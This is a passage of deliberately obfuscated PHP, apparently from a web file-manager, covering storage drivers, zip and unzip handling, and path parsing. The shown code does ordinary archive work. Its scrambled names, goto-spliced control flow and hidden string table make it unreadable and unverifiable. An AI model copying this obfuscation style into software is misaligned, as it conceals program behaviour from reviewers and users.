$f¡§∆ÆŒÖ = array($D‘≠‡∞∑Í√[747] => $D‘≠‡∞∑Í√[748], $D‘≠‡∞∑Í√[6] => $FÊÏ¯Ì…™˘); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $a‡ŒÓãõ⁄© = $GLOBALS[$D‘≠‡∞∑Í√[749]]; self::$driverListUser = array_to_keyvalue($a‡ŒÓãõ⁄©, $D‘≠‡∞∑Í√[366]); } $f¡§∆ÆŒÖ = self::$driverListUser[$e÷Æ∏Èÿø]; break; case KodIO::KOD_SHARE_LINK: case KodIO::KOD_SHARE_ITEM: $f¡§∆ÆŒÖ = array($D‘≠‡∞∑Í√[747] => $D‘≠‡∞∑Í√[748], $D‘≠‡∞∑Í√[6] => $FÊÏ¯Ì…™˘); break; default: $E•÷¨‰ô⁄ = $FÊÏ¯Ì…™˘[$D‘≠‡∞∑Í√[84]]; $f¡§∆ÆŒÖ = array($D‘≠‡∞∑Í√[747] => $D‘≠‡∞∑Í√[750]); break; } $a‹ÀÈÛÖ¨œ = $FÊÏ¯Ì…™˘[$D‘≠‡∞∑Í√[84]]; if (!isset(self::$driverCache[$a‹ÀÈÛÖ¨œ])) { $Cü„÷Æë«Ö = $D‘≠‡∞∑Í√[80] . self::driverType($f¡§∆ÆŒÖ[$D‘≠‡∞∑Í√[97]]); if (!class_exists($Cü„÷Æë«Ö)) { show_json("{$Cü„÷Æë«Ö}\40\x6e\157\164\40\145\170\151\163\x74\163\41", !1); } $eìÊ¥∫ù∏¿ = isset($f¡§∆ÆŒÖ[$D‘≠‡∞∑Í√[6]]) ? $f¡§∆ÆŒÖ[$D‘≠‡∞∑Í√[6]] : !1; self::$driverCache[$a‹ÀÈÛÖ¨œ] = new $Cü„÷Æë«Ö($eìÊ¥∫ù∏¿); } goto Bãõòéù›ñ; b–ò∑«ôÂØ: if (isset($f¡§∆ÆŒÖ[$D‘≠‡∞∑Í√[6]][$D‘≠‡∞∑Í√[751]])) { $bÔ˜ÿ∆õ‡Ñ->pathBase = rtrim($f¡§∆ÆŒÖ[$D‘≠‡∞∑Í√[6]][$D‘≠‡∞∑Í√[751]], $D‘≠‡∞∑Í√[8]) . $D‘≠‡∞∑Í√[8]; $E•÷¨‰ô⁄ = $bÔ˜ÿ∆õ‡Ñ->pathBase . ltrim($E•÷¨‰ô⁄, $D‘≠‡∞∑Í√[8]); } $E•÷¨‰ô⁄ = $bÔ˜ÿ∆õ‡Ñ->getPath($E•÷¨‰ô⁄); $bÔ˜ÿ∆õ‡Ñ->path = $E•÷¨‰ô⁄; goto Fâß®ÎﬂÚâ; Aãü…€Â°§: } private static function driverType($a˘óÎñ¢÷Á) { $c”ˆ°õü˜∫ =& $_SERVER[∞„˜ƒÑºª]; $a˘óÎñ¢÷Á = strtolower($a˘óÎñ¢÷Á); if ($a˘óÎñ¢÷Á == $c”ˆ°õü˜∫[73]) { $a˘óÎñ¢÷Á = $c”ˆ°õü˜∫[752]; } else { if (in_array($a˘óÎñ¢÷Á, array($c”ˆ°õü˜∫[133], $c”ˆ°õü˜∫[66], $c”ˆ°õü˜∫[753]))) { $a˘óÎñ¢÷Á = ucfirst($a˘óÎñ¢÷Á); } else { $a˘óÎñ¢÷Á = strtoupper($a˘óÎñ¢÷Á); } } return $a˘óÎñ¢÷Á; } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $eÂƒÛÑµéÖ; if (!$eÂƒÛÑµéÖ) { $Fÿ€¬ç⁄ã· = IO::init($_SERVER[∞„˜ƒÑºª][8]); } return $Fÿ€¬ç⁄ã·; } private static function iconvSystem($AËıï‘çæ◊) { return self::local()->iconvSystem($AËıï‘çæ◊); } private static function iconvApp($cêä’Ü⁄¨Ú) { return self::local()->iconvApp($cêä’Ü⁄¨Ú); } public static function zip($eÓ„∫®π€∆, $e◊ƒ´ëÖÇ– = "\172\x69\x70", $aä¨€©÷ﬁÑ = '', $eí⁄˘Á∫ã· = REPEAT_RENAME) { goto e˘ã◊Æﬂ◊ù; FÖÈˆ’∂¿„: if (count($EñıÜ¯¢Ò∫) > 1) { $CÓﬂ≥°–¡¿ = isset($f©Ø∫˜πˆ†[$D£∑∫ûøùÏ[755]]) ? $f©Ø∫˜πˆ†[$D£∑∫ûøùÏ[755]] : $f©Ø∫˜πˆ†[$D£∑∫ûøùÏ[84]]; $DÒÕØÁˆ˜Û = get_path_this(get_path_father($CÓﬂ≥°–¡¿)); } $aÉ◊Èï´∑√ = $Bÿ‚Ìé ä±; if (!$aÉ◊Èï´∑√) { $aÉ◊Èï´∑√ = get_path_father($f©Ø∫˜πˆ†[$D£∑∫ûøùÏ[84]]); $F≥‘Ω‘„¯ = IO::info($aÉ◊Èï´∑√); if (!$F≥‘Ω‘„¯[$D£∑∫ûøùÏ[185]]) { show_json(LNG($D£∑∫ûøùÏ[756]), !1); } } goto B∑∫∆¡¬›É; D©¥ﬂ®íÑ„: if ($aä¨€©÷ﬁÑ || !$Bÿ‚Ìé ä±) { if ($Bÿ‚Ìé ä± && strstr($Bÿ‚Ìé ä±, TEMP_FILES)) { $AÖúñÑ≥ìö = $EñıÜ¯¢Ò∫ = array(); recursion_dir($aÉ◊Èï´∑√, $AÖúñÑ≥ìö, $EñıÜ¯¢Ò∫, 0); foreach ($AÖúñÑ≥ìö as $eµæüÜÁ‹™) { del_dir($eµæüÜÁ‹™); } foreach ($EñıÜ¯¢Ò∫ as $B”àè‡≥Ö¯) { if ($B”àè‡≥Ö¯ == $DéÏ¡∆◊∫) { continue; } del_file($B”àè‡≥Ö¯); } } return $bóÚ¨”“¢∫; } $d‚Ö°°Ê€Ñ = self::pathFather($f©Ø∫˜πˆ†[$D£∑∫ûøùÏ[84]]); $d‚Ö°°Ê€Ñ = $cÑ∏ÀÜú¬Ω->getPathOuter($cÑ∏ÀÜú¬Ω->iconvSystem($d‚Ö°°Ê€Ñ)); goto cËùü∫Ñæ; D⁄Âè´ﬁ÷Ø: foreach ($EñıÜ¯¢Ò∫ as $Eµìî‚ü• => $B≤—Â◊ãÏ∞) { $EñıÜ¯¢Ò∫[$Eµìî‚ü•] = self::iconvSystem($B≤—Â◊ãÏ∞); } KodArchive::create($DéÏ¡∆◊∫, $EñıÜ¯¢Ò∫); if (!IO::exist($bóÚ¨”“¢∫)) { if ($Bÿ‚Ìé ä±) { del_dir($Bÿ‚Ìé ä±); } show_json(LNG($D£∑∫ûøùÏ[757]), !1); } goto D©¥ﬂ®íÑ„; A≈ÜéÊ»èÌ: $Bÿ‚Ìé ä± = !1; if (!$aä¨€©÷ﬁÑ && $cÑ∏ÀÜú¬Ω->getType() == $D£∑∫ûøùÏ[133]) { $EñıÜ¯¢Ò∫ = self::zipFileList($eÓ„∫®π€∆); } else { $Bÿ‚Ìé ä± = $aä¨€©÷ﬁÑ ? $aä¨€©÷ﬁÑ : TEMP_FILES . $D£∑∫ûøùÏ[754] . time() . rand_string(5) . $D£∑∫ûøùÏ[8]; mk_dir($Bÿ‚Ìé ä±); $EñıÜ¯¢Ò∫ = self::zipFileList($eÓ„∫®π€∆, $Bÿ‚Ìé ä±); } $DÒÕØÁˆ˜Û = $f©Ø∫˜πˆ†[$D£∑∫ûøùÏ[28]]; goto FÖÈˆ’∂¿„; d’Èª§ˆêÏ: return $b¢Û„ µ‡»; goto Dû™Ñ˜√ÿ; cËùü∫Ñæ: $b¢Û„ µ‡» = self::move($bóÚ¨”“¢∫, $d‚Ö°°Ê€Ñ, $eí⁄˘Á∫ã·); if (!$b¢Û„ µ‡») { del_dir($Bÿ‚Ìé ä±); show_json(LNG($D£∑∫ûøùÏ[757]), !1); } del_dir($Bÿ‚Ìé ä±); goto d’Èª§ˆêÏ; B∑∫∆¡¬›É: $bóÚ¨”“¢∫ = $aÉ◊Èï´∑√ . $DÒÕØÁˆ˜Û . $D£∑∫ûøùÏ[98] . $e◊ƒ´ëÖÇ–; $bóÚ¨”“¢∫ = get_filename_auto($bóÚ¨”“¢∫, $D£∑∫ûøùÏ[33], $eí⁄˘Á∫ã·); $DéÏ¡∆◊∫ = self::iconvSystem($bóÚ¨”“¢∫); goto D⁄Âè´ﬁ÷Ø; e˘ã◊Æﬂ◊ù: $D£∑∫ûøùÏ =& $_SERVER[∞„˜ƒÑºª]; $cÑ∏ÀÜú¬Ω = self::init($eÓ„∫®π€∆[0][$D£∑∫ûøùÏ[84]]); $f©Ø∫˜πˆ† = self::info($eÓ„∫®π€∆[0][$D£∑∫ûøùÏ[84]]); goto A≈ÜéÊ»èÌ; Dû™Ñ˜√ÿ: } public static function unzip($bö„ûç›∫˜, $Díàøá”Ç© = "\x72\x65\160\x6c\x61\143\x65") { goto c∆·â∆éÒ÷; dÈπÎò«Üç: $A˜åéòÎà– = self::iconvSystem($A˜åéòÎà–); $Bâƒß¢∆âå = isset($bö„ûç›∫˜[$d÷ŒÉÌó†[760]]) ? $bö„ûç›∫˜[$d÷ŒÉÌó†[760]] : $d÷ŒÉÌó†[761]; $f÷‚¨èËà¬ = KodArchive::extract($A˜åéòÎà–, $aﬁﬂó”ßËâ . $d÷ŒÉÌó†[8], $Bâƒß¢∆âå); goto aƒ¯å˜ö–£; aƒ¯å˜ö–£: self::archiveExt(); if (!$f÷‚¨èËà¬[$d÷ŒÉÌó†[762]]) { show_json($d÷ŒÉÌó†[763] . $f÷‚¨èËà¬[$d÷ŒÉÌó†[764]], !1); } Hook::trigger($d÷ŒÉÌó†[765], $aﬁﬂó”ßËâ); goto Aî œèä†±; c∆·â∆éÒ÷: $d÷ŒÉÌó† =& $_SERVER[∞„˜ƒÑºª]; $cÑ¥≈Æµ°û = $bö„ûç›∫˜[$d÷ŒÉÌó†[84]]; $A†“‹˜∑¥” = $bö„ûç›∫˜[$d÷ŒÉÌó†[758]]; goto C¿ãôÒ˘Æ…; A»ãÁæá©Œ: $F¿◊ªÇ©ÿ¯ = self::tmpFileName($a€‘õÇíüÈ); $aﬁﬂó”ßËâ = TEMP_FILES . $F¿◊ªÇ©ÿ¯; del_dir($aﬁﬂó”ßËâ); goto B“õ¶Ôù¬Ç; c†»Ì—Ô ´: del_dir($aﬁﬂó”ßËâ); if (!$EÁÜ‹’ÿ¢Õ) { del_file($A˜åéòÎà–); } return !0; goto fŒΩã’Û„˘; Aî œèä†±: recursion_dir($aﬁﬂó”ßËâ, $a©ÿç°ë˘ò, $D™ÊíŒ¯éá, 0); $dÎÕÎßÍÆ∂ = array_merge($a©ÿç°ë˘ò, $D™ÊíŒ¯éá); foreach ($dÎÕÎßÍÆ∂ as $C¿áøãˆ¥§) { $C¿áøãˆ¥§ = self::iconvApp($C¿áøãˆ¥§); self::move($C¿áøãˆ¥§, $A†“‹˜∑¥”, $Díàøá”Ç©); } goto c†»Ì—Ô ´; B“õ¶Ôù¬Ç: mk_dir($aﬁﬂó”ßËâ); $A˜åéòÎà– = $aﬁﬂó”ßËâ . $d÷ŒÉÌó†[98] . $a€‘õÇíüÈ[$d÷ŒÉÌó†[156]]; if (!@file_exists(self::iconvSystem($A˜åéòÎà–))) { $EÁÜ‹’ÿ¢Õ = self::localFilePath($cÑ¥≈Æµ°û, $a€‘õÇíüÈ[$d÷ŒÉÌó†[156]]); $A˜åéòÎà– = $EÁÜ‹’ÿ¢Õ ? $EÁÜ‹’ÿ¢Õ : parent::download($cÑ¥≈Æµ°û, $A˜åéòÎà–); } goto dÈπÎò«Üç; C¿ãôÒ˘Æ…: if (!($a€‘õÇíüÈ = parent::info($cÑ¥≈Æµ°û))) { show_json(LNG($d÷ŒÉÌó†[759]), !1); } if (!($Eıπ‹Ï∑Àö = parent::infoFull($A†“‹˜∑¥”))) { $A†“‹˜∑¥” = parent::mkdir($A†“‹˜∑¥”); $Eıπ‹Ï∑Àö = array($d÷ŒÉÌó†[84] => $A†“‹˜∑¥”); } else { if (isset($Eıπ‹Ï∑Àö[$d÷ŒÉÌó†[374]]) && trim($Eıπ‹Ï∑Àö[$d÷ŒÉÌó†[84]], $d÷ŒÉÌó†[8]) != trim($A†“‹˜∑¥”, $d÷ŒÉÌó†[8])) { $eªÖπÍÚµô = KodIO::make($Eıπ‹Ï∑Àö[$d÷ŒÉÌó†[384]]); $B≥∞‡åöê– = parent::fileNameAuto($eªÖπÍÚµô, $Eıπ‹Ï∑Àö[$d÷ŒÉÌó†[28]], REPEAT_RENAME_FOLDER, !0); $A†“‹˜∑¥” = parent::mkdir($eªÖπÍÚµô . $B≥∞‡åöê–); $Eıπ‹Ï∑Àö = array($d÷ŒÉÌó†[84] => $A†“‹˜∑¥”); } } $A†“‹˜∑¥” = $Eıπ‹Ï∑Àö[$d÷ŒÉÌó†[84]]; goto A»ãÁæá©Œ; fŒΩã’Û„˘: } public function unzipList($BÆ∏îåö…£) { goto bÆÇ±æ∫”‰; bÆÇ±æ∫”‰: $bÈÈ‰–Ã©´ =& $_SERVER[∞„˜ƒÑºª]; $fÀàÑ∫›»ì = $BÆ∏îåö…£[$bÈÈ‰–Ã©´[84]]; $fâà•Ï«ñﬂ = isset($BÆ∏îåö…£[$bÈÈ‰–Ã©´[766]]) ? $BÆ∏îåö…£[$bÈÈ‰–Ã©´[766]] : -1; goto d¯»◊µªπ±; fÍä‹öÔ•ﬁ: self::setContent($c∂úÑ°éÚÉ, $Bíå≈ÜÔ–ô); if (count($aÑâÜÉ¨∆È[$bÈÈ‰–Ã©´[764]]) >= $C°è·»ƒé¶) { show_json(sprintf(LNG($bÈÈ‰–Ã©´[768]), count($aÑâÜÉ¨∆È[$bÈÈ‰–Ã©´[764]])), !1); } return $aÑâÜÉ¨∆È[$bÈÈ‰–Ã©´[764]]; goto E’»ÏèÀâ¶; d¯»◊µªπ±: $C°è·»ƒé¶ = 50000; if (request_url_safe($fÀàÑ∫›»ì)) { $B◊àÍä®ªÏ = parse_url_query($fÀàÑ∫›»ì); if (!isset($B◊àÍä®ªÏ[$bÈÈ‰–Ã©´[84]])) { show_json($bÈÈ‰–Ã©´[767], !1); } } $eŒπ¨ë« ë = isset($B◊àÍä®ªÏ) ? $B◊àÍä®ªÏ[$bÈÈ‰–Ã©´[84]] : $fÀàÑ∫›»ì; goto eıŸ…¯êõø; AõÛìÌ§√ò: $b—Ö∑ò∑˜Ø = $Cº√§õ¿Ω‹ . $bÈÈ‰–Ã©´[8] . $EÈƒ¶∏¢§≈; if (!@file_exists(self::iconvSystem($b—Ö∑ò∑˜Ø))) { if (isset($B◊àÍä®ªÏ)) { url_request($fÀàÑ∫›»ì, $bÈÈ‰–Ã©´[769], $b—Ö∑ò∑˜Ø); } else { $c¢Û†€¡ïÇ = self::localFilePath($fÀàÑ∫›»ì, $BÛµöÇ›Ò†[$bÈÈ‰–Ã©´[156]]); $b—Ö∑ò∑˜Ø = $c¢Û†€¡ïÇ ? $c¢Û†€¡ïÇ : self::download($fÀàÑ∫›»ì, $b—Ö∑ò∑˜Ø); } } $b—Ö∑ò∑˜Ø = self::iconvSystem($b—Ö∑ò∑˜Ø); goto BàÔÀÛÏìÊ; BàÔÀÛÏìÊ: if ($fâà•Ï«ñﬂ >= 0) { $D¬üÚæµ‹€ = isset($BÆ∏îåö…£[$bÈÈ‰–Ã©´[770]]) ? $BÆ∏îåö…£[$bÈÈ‰–Ã©´[770]] : !1; $e’ºíÿ£áˆ = isset($BÆ∏îåö…£[$bÈÈ‰–Ã©´[28]]) ? $BÆ∏îåö…£[$bÈÈ‰–Ã©´[28]] : $bÈÈ‰–Ã©´[33]; KodArchive::filePreview($b—Ö∑ò∑˜Ø, $fâà•Ï«ñﬂ, $D¬üÚæµ‹€, $e’ºíÿ£áˆ); self::archiveExt(); die; } $aÑâÜÉ¨∆È = KodArchive::listContent($b—Ö∑ò∑˜Ø); self::archiveExt(); goto E¢ˆ˘É¿⁄Ô; d•îÇã‡≈å: if ($fâà•Ï«ñﬂ == -1) { $c∂úÑ°éÚÉ = IO_PATH_SYSTEM_TEMP . "\172\x69\x70\126\x69\x65\167\x2f{$Fß—Ì÷õÃ£}\x2f{$EÈƒ¶∏¢§≈}\56\154\x6f\x67"; $FáﬁΩé◊Âü = self::infoFull($c∂úÑ°éÚÉ); if ($FáﬁΩé◊Âü) { $c∂úÑ°éÚÉ = $FáﬁΩé◊Âü[$bÈÈ‰–Ã©´[84]]; $E«√ŸÑÈç∂ = self::getContent($c∂úÑ°éÚÉ); if ($E«√ŸÑÈç∂) { $Bíå≈ÜÔ–ô = json_decode($E«√ŸÑÈç∂, !0); if (count($Bíå≈ÜÔ–ô) >= $C°è·»ƒé¶) { show_json(sprintf(LNG($bÈÈ‰–Ã©´[768]), count($Bíå≈ÜÔ–ô)), !1); } return $Bíå≈ÜÔ–ô; } } else { $c∂úÑ°éÚÉ = self::mkfile($c∂úÑ°éÚÉ); } } $Cº√§õ¿Ω‹ = TEMP_FILES . $Fß—Ì÷õÃ£; if (!is_dir($Cº√§õ¿Ω‹)) { mk_dir($Cº√§õ¿Ω‹); } goto AõÛìÌ§√ò; eıŸ…¯êõø: $BÛµöÇ›Ò† = self::info($eŒπ¨ë« ë); $Fß—Ì÷õÃ£ = self::tmpFileName($BÛµöÇ›Ò†); if (isset($B◊àÍä®ªÏ)) { $CñÆÖ¿≥∏Ú = array($B◊àÍä®ªÏ[$bÈÈ‰–Ã©´[84]], $B◊àÍä®ªÏ[$bÈÈ‰–Ã©´[766]], $B◊àÍä®ªÏ[$bÈÈ‰–Ã©´[28]]); $EÈƒ¶∏¢§≈ = md5(implode($bÈÈ‰–Ã©´[79], $CñÆÖ¿≥∏Ú)) . $bÈÈ‰–Ã©´[98] . get_path_ext($B◊àÍä®ªÏ[$bÈÈ‰–Ã©´[28]]); } else { $CñÆÖ¿≥∏Ú = array($BÛµöÇ›Ò†[$bÈÈ‰–Ã©´[28]], $BÛµöÇ›Ò†[$bÈÈ‰–Ã©´[84]], $BÛµöÇ›Ò†[$bÈÈ‰–Ã©´[86]]); $EÈƒ¶∏¢§≈ = md5(implode($bÈÈ‰–Ã©´[79], $CñÆÖ¿≥∏Ú)) . $bÈÈ‰–Ã©´[98] . $BÛµöÇ›Ò†[$bÈÈ‰–Ã©´[156]]; } goto d•îÇã‡≈å; E¢ˆ˘É¿⁄Ô: del_dir($Cº√§õ¿Ω‹); if (!$aÑâÜÉ¨∆È[$bÈÈ‰–Ã©´[762]]) { show_json($aÑâÜÉ¨∆È[$bÈÈ‰–Ã©´[764]], !1); } $Bíå≈ÜÔ–ô = json_encode($aÑâÜÉ¨∆È[$bÈÈ‰–Ã©´[764]]); goto fÍä‹öÔ•ﬁ; E’»ÏèÀâ¶: } private function zipFileList($Cºé∑÷âç†, $BÇÏ»¿œ—” = false) { $E§Ûç©‘ò… =& $_SERVER[∞„˜ƒÑºª]; $B Á†”∂áò = array(); foreach ($Cºé∑÷âç† as $a…èÏÉÍ√Ÿ) { $bëüöç™ﬂâ = $a…èÏÉÍ√Ÿ[$E§Ûç©‘ò…[84]]; if ($BÇÏ»¿œ—”) { $bëüöç™ﬂâ = self::copy($a…èÏÉÍ√Ÿ[$E§Ûç©‘ò…[84]], $BÇÏ»¿œ—”, $E§Ûç©‘ò…[511]); } if ($bëüöç™ﬂâ && self::local()->exist($bëüöç™ﬂâ)) { $B Á†”∂áò[$a…èÏÉÍ√Ÿ[$E§Ûç©‘ò…[84]]] = $bëüöç™ﬂâ; } } if (!empty($B Á†”∂áò)) { return array_values($B Á†”∂áò); } show_json(LNG($E§Ûç©‘ò…[771]), !1); } public static function tmpFileName($A–“ºÎì∂Í) { $bÔÓÊÚ€Õâ =& $_SERVER[∞„˜ƒÑºª]; $D¿ΩÊÕ–†ç = array($A–“ºÎì∂Í[$bÔÓÊÚ€Õâ[28]], $A–“ºÎì∂Í[$bÔÓÊÚ€Õâ[84]], $A–“ºÎì∂Í[$bÔÓÊÚ€Õâ[86]], $A–“ºÎì∂Í[$bÔÓÊÚ€Õâ[373]]); return md5(implode($bÔÓÊÚ€Õâ[79], $D¿ΩÊÕ–†ç)); } private function localFilePath($DØı≈æ⁄øª, $CµÜß¡¬“ê) { goto dáéèÉåñ°; dÑ¯ëœ≈Í: return $EπßΩﬁïäÍ->path; goto F‡∑ÏΩì»¬; BõÔ™ı©ÀÈ: if ($E†è∑Ÿ´á != $C¿§¥“œ»Ã[133] || $CµÜß¡¬“ê == $C¿§¥“œ»Ã[774] && $bàØËπÆπã) { return !1; } if (!$EπßΩﬁïäÍ->exist($EπßΩﬁïäÍ->path)) { show_json(LNG($C¿§¥“œ»Ã[107]), !1); } self::archiveExt($CµÜß¡¬“ê); goto dÑ¯ëœ≈Í; e®º∆ˆ∂Ú¢: $EπßΩﬁïäÍ = self::init($DØı≈æ⁄øª); $E†è∑Ÿ´á = $EπßΩﬁïäÍ->getType(); $bàØËπÆπã = strtoupper(substr(PHP_OS, 0, 3)) == $C¿§¥“œ»Ã[773]; goto BõÔ™ı©ÀÈ; dáéèÉåñ°: $C¿§¥“œ»Ã =& $_SERVER[∞„˜ƒÑºª]; $CÈùÉ∆œß“ = KodIO::parse($DØı≈æ⁄øª); if ($CÈùÉ∆œß“[$C¿§¥“œ»Ã[29]] == KodIO::KOD_SOURCE) { $DúË≤â‹–ê = Model($C¿§¥“œ»Ã[520])->fileInfoGet(KodIO::sourceID($DØı≈æ⁄øª)); if (!$DúË≤â‹–ê[$C¿§¥“œ»Ã[84]]) { show_json($C¿§¥“œ»Ã[772], !1); } $DØı≈æ⁄øª = $DúË≤â‹–ê[$C¿§¥“œ»Ã[84]]; } goto e®º∆ˆ∂Ú¢; F‡∑ÏΩì»¬: } private function archiveExt($düÙáÔ“› = '') { $GLOBALS[$_SERVER[∞„˜ƒÑºª][775]] = $düÙáÔ“›; } } class KodIO { const KOD_SOURCE = "\173\163\157\165\162\143\145\x7d"; const KOD_USER_RECYCLE = "\x7b\x75\163\x65\162\122\x65\143\x79\143\x6c\145\x7d"; const KOD_USER_FAV = "\173\x75\x73\x65\162\x46\141\x76\x7d"; const KOD_USER_FILE_TAG = "\173\165\x73\x65\x72\x46\x69\154\145\x54\141\x67\175"; const KOD_USER_FILE_TYPE = "\173\x75\x73\x65\x72\106\x69\154\145\x54\171\x70\145\x7d"; const KOD_GROUP_ROOT_SELF = "\x7b\147\162\x6f\x75\160\122\x6f\157\x74\123\145\x6c\146\x7d"; const KOD_USER_SHARE = "\173\x75\x73\x65\162\x53\150\x61\162\145\175"; const KOD_USER_SHARE_TO_ME = "\173\163\150\x61\x72\145\124\x6f\115\145\175"; const KOD_SHARE_ITEM = "\x7b\x73\x68\141\x72\145\111\164\x65\155\x7d"; const KOD_SHARE_LINK = "\173\163\x68\x61\162\145\x49\164\x65\155\x4c\151\156\153\x7d"; const KOD_SEARCH = "\x7b\x73\x65\x61\x72\143\x68\175"; const KOD_BLOCK = "\173\142\154\x6f\143\153\x7d"; const KOD_IO = "\x7b\x69\157\175"; const KOD_USER_RECENT = "\173\165\x73\145\162\122\145\156\x63\x65\x6e\x74\175"; const KOD_USER_DRIVER = "\173\x75\163\145\162\x44\x72\151\166\145\x72\175"; public static function typeList() { $cå‚Íé∑—∏ =& $_SERVER[∞„˜ƒÑºª]; return array($cå‚Íé∑—∏[776] => self::KOD_SOURCE, $cå‚Íé∑—∏[777] => self::KOD_USER_RECYCLE, $cå‚Íé∑—∏[778] => self::KOD_USER_FAV, $cå‚Íé∑—∏[779] => self::KOD_USER_FILE_TAG, $cå‚Íé∑—∏[780] => self::KOD_USER_FILE_TYPE, $cå‚Íé∑—∏[781] => self::KOD_GROUP_ROOT_SELF, $cå‚Íé∑—∏[782] => self::KOD_USER_SHARE, $cå‚Íé∑—∏[783] => self::KOD_USER_SHARE_TO_ME, $cå‚Íé∑—∏[784] => self::KOD_SHARE_ITEM, $cå‚Íé∑—∏[785] => self::KOD_SHARE_LINK, $cå‚Íé∑—∏[786] => self::KOD_SEARCH, $cå‚Íé∑—∏[787] => self::KOD_BLOCK, $cå‚Íé∑—∏[788] => self::KOD_IO, $cå‚Íé∑—∏[789] => self::KOD_USER_RECENT, $cå‚Íé∑—∏[790] => self::KOD_USER_DRIVER); } public static function parse($aÿ¯ºÎ¯öê) { goto e”íâÍ§Œƒ; e◊¿ÍÆ›çè: preg_match($d±ñﬂãıø∑[791], $aÿ¯ºÎ¯öê, $Bù Ωêß»Õ); $EÕÂÑŒé»í = array($d±ñﬂãıø∑[792] => !1, $d±ñﬂãıø∑[793] => !1, $d±ñﬂãıø∑[794] => !1, $d±ñﬂãıø∑[84] => $aÿ¯ºÎ¯öê, $d±ñﬂãıø∑[746] => !1, $d±ñﬂãıø∑[745] => $d±ñﬂãıø∑[33]); if (is_array($Bù Ωêß»Õ) && count($Bù Ωêß»Õ) == 5) { $A»ó§ÎäÏ∂ = $d±ñﬂãıø∑[795] . $Bù Ωêß»Õ[2] . $d±ñﬂãıø∑[314]; if (in_array($A»ó§ÎäÏ∂, $d‡µé¨∑–⁄)) { $EÕÂÑŒé»í[$d±ñﬂãıø∑[746]] = $Bù Ωêß»Õ[1]; $EÕÂÑŒé»í[$d±ñﬂãıø∑[29]] = $A»ó§ÎäÏ∂; $EÕÂÑŒé»í[$d±ñﬂãıø∑[796]] = substr($A»ó§ÎäÏ∂, 1, -1); $EÕÂÑŒé»í[$d±ñﬂãıø∑[366]] = $Bù Ωêß»Õ[3]; } $EÕÂÑŒé»í[$d±ñﬂãıø∑[745]] = $Bù Ωêß»Õ[4]; } goto B˘ëﬂûé∫’; e”íâÍ§Œƒ: $d±ñﬂãıø∑ =& $_SERVER[∞„˜ƒÑºª]; $aÿ¯ºÎ¯öê = self::clear($aÿ¯ºÎ¯öê); $d‡µé¨∑–⁄ = array_values(self::typeList()); goto e◊¿ÍÆ›çè; B˘ëﬂûé∫’: return $EÕÂÑŒé»í; goto dÁ∫èÆÌ›ô; dÁ∫èÆÌ›ô: } public static function clear($F®åùÆÇÙ¿) { goto bë˘àÂ∏±»; D”ÓØ‹≈ÚÓ: if (substr($F®åùÆÇÙ¿, 0, 3) == $f≤Ñï‰üã≈[798]) { $F®åùÆÇÙ¿ = substr($F®åùÆÇÙ¿, 3); } while (strstr($F®åùÆÇÙ¿, $bàµ—ê≠„Õ)) { $F®åùÆÇÙ¿ = str_replace($bàµ—ê≠„Õ, $f≤Ñï‰üã≈[8], $F®åùÆÇÙ¿); } $F®åùÆÇÙ¿ = preg_replace($f≤Ñï‰üã≈[799], $f≤Ñï‰üã≈[8], $F®åùÆÇÙ¿); goto fœÑ∆Ã£›æ; fœÑ∆Ã£›æ: if ($F®åùÆÇÙ¿ == $f≤Ñï‰üã≈[8]) { return $f≤Ñï‰üã≈[8]; } $F®åùÆÇÙ¿ = rtrim($F®åùÆÇÙ¿, $f≤Ñï‰üã≈[8]); return $F®åùÆÇÙ¿; goto e¿∏å£¢®©; bë˘àÂ∏±»: $f≤Ñï‰üã≈ =& $_SERVER[∞„˜ƒÑºª]; $F®åùÆÇÙ¿ = str_replace($f≤Ñï‰üã≈[100], $f≤Ñï‰üã≈[8], $F®åùÆÇÙ¿); $bàµ—ê≠„Õ = $f≤Ñï‰üã≈[797]; goto D”ÓØ‹≈ÚÓ; e¿∏å£¢®©: } public static function sourceID($bÒ°åÎûÌπ) { $cÕé≥¿‡Ø€ =& $_SERVER[∞„˜ƒÑºª]; $CÍÏ≤ÁÉöÂ = self::parse($bÒ°åÎûÌπ); if ($CÍÏ≤ÁÉöÂ[$cÕé≥¿‡Ø€[29]] !== self::KOD_SOURCE) { show_json("\x5b{$bÒ°åÎûÌπ}\x5d\40" . LNG($cÕé≥¿‡Ø€[800]), !1); } return $CÍÏ≤ÁÉöÂ[$cÕé≥¿‡Ø€[366]]; } public static function make($a∆∑—§ÿúÕ) { if (!$a∆∑—§ÿúÕ) { return !1; } return self::makePath(self::KOD_SOURCE, intval($a∆∑—§ÿúÕ)); } public static function makeShare($fæ·¥ªÎ©Á, $fö†•‡ãïç) { return self::makePath(self::KOD_SHARE_ITEM, $fæ·¥ªÎ©Á, $fö†•‡ãïç); } public static function makeFileTypePath($F«±í”ﬁ≈Ø) { return self::makePath(self::KOD_USER_FILE_TYPE, $F«±í”ﬁ≈Ø); } public static function makeFileTagPath($FÍ“üà≈£ı) { return self::makePath(self::KOD_USER_FILE_TAG, $FÍ“üà≈£ı); } public static function makePath($f˘ƒó‘«ŸÕ, $a¶°ã◊∂≥◊ = '', $EÒ•†Í€©Ì = '') { $EàÙÖä‰æ´ =& $_SERVER[∞„˜ƒÑºª]; $dé«Îô¿ô¯ = substr($f˘ƒó‘«ŸÕ, 1, -1); $fÚÖ◊Øë™ç = $EàÙÖä‰æ´[801] . $dé«Îô¿ô¯ . $EàÙÖä‰æ´[491] . $a¶°ã◊∂≥◊ . $EàÙÖä‰æ´[802]; $fÚÖ◊Øë™ç = $EÒ•†Í€©Ì ? $fÚÖ◊Øë™ç . $EÒ•†Í€©Ì . $EàÙÖä‰æ´[8] : $fÚÖ◊Øë™ç; return $fÚÖ◊Øë™ç; } public static function initSystemPath() { $Cÿ–÷Ì‚Êî =& $_SERVER[∞„˜ƒÑºª]; $e‰ãÎ…ºé√ = array($Cÿ–÷Ì‚Êî[803] => $Cÿ–÷Ì‚Êî[804], $Cÿ–÷Ì‚Êî[805] => $Cÿ–÷Ì‚Êî[806], $Cÿ–÷Ì‚Êî[807] => $Cÿ–÷Ì‚Êî[808], $Cÿ–÷Ì‚Êî[809] => $Cÿ–÷Ì‚Êî[810]); foreach ($e‰ãÎ…ºé√ as $d⁄ò√∆Ú¡– => $fﬂá«ó¿ÑÇ) { if (!defined($d⁄ò√∆Ú¡–)) { define($d⁄ò√∆Ú¡–, self::systemPath($fﬂá«ó¿ÑÇ)); } } } private static function systemPath($c÷¶í»Ω®±) { goto 